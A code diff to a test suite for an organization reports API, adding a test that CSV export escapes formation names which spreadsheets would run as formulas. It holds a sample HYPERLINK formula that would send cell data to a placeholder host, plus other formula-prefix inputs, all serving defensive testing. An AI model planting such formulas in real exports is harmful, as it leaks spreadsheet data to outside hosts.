@@ -10,6 +10,7 @@ const mocks = vi.hoisted(() => ({
   quizFilters: [] as unknown[][],
   shareFilters: [] as unknown[][],
   emptyMeasures: false,
+  stageName: 'Formation agrégée',
   failedTable: null as string | null,
   telemetryRows: null as Array<{ stage_id: string; completion_rate: number }> | null,
   ranges: [] as number[][],
@@ -62,10 +63,7 @@ function createSupabaseFixture(privileged = false) {
       : [{ data: mocks.membershipRole ? { role: mocks.membershipRole } : null }],
     organizations: [{ data: { name: 'Organisation A', status: mocks.organizationStatus } }],
     shared_classrooms: [{ data: [] }],
-    stages: [
-      { data: [{ id: 'stage-1' }] },
-      { data: [{ id: 'stage-1', name: 'Formation agrégée' }] },
-    ],
+    stages: [{ data: [{ id: 'stage-1' }] }, { data: [{ id: 'stage-1', name: mocks.stageName }] }],
     quiz_results: [
       {
         data: [
@@ -153,6 +151,7 @@ describe('institutional report privacy boundary', () => {
     mocks.failedTable = null;
     mocks.telemetryRows = null;
     mocks.ranges.length = 0;
+    mocks.stageName = 'Formation agrégée';
   });
 
   it('refuses a user who is not a member of the requested organization', async () => {
@@ -229,6 +228,26 @@ describe('institutional report privacy boundary', () => {
     expect(csv).not.toContain('learner-secret-id');
     expect(csv).not.toContain('nickname');
     expect(csv).not.toContain('user_id');
+  });
+
+  it('neutralizes a formation name that a spreadsheet would run as a formula', async () => {
+    const { GET } = await import('@/app/api/organizations/[orgId]/reports/route');
+    const csvFor = async (name: string) => {
+      mocks.stageName = name;
+      const response = await GET(
+        new Request('http://localhost/api/organizations/org-1/reports?format=csv') as NextRequest,
+        { params: Promise.resolve({ orgId: 'org-1' }) },
+      );
+      return response.text();
+    };
+
+    expect(await csvFor('=HYPERLINK("https://x/?"&A1,"Voir")')).toContain(
+      `"'=HYPERLINK(""https://x/?""&A1,""Voir"")"`,
+    );
+    for (const name of ['+1', '-1', '@SUM(A1)', '\tx']) {
+      expect(await csvFor(name)).toContain(`"'${name}"`);
+    }
+    expect(await csvFor('2026 : bilan')).toContain('"2026 : bilan"');
   });
 
   it('never passes individual learner rows to the PDF renderer', async () => {
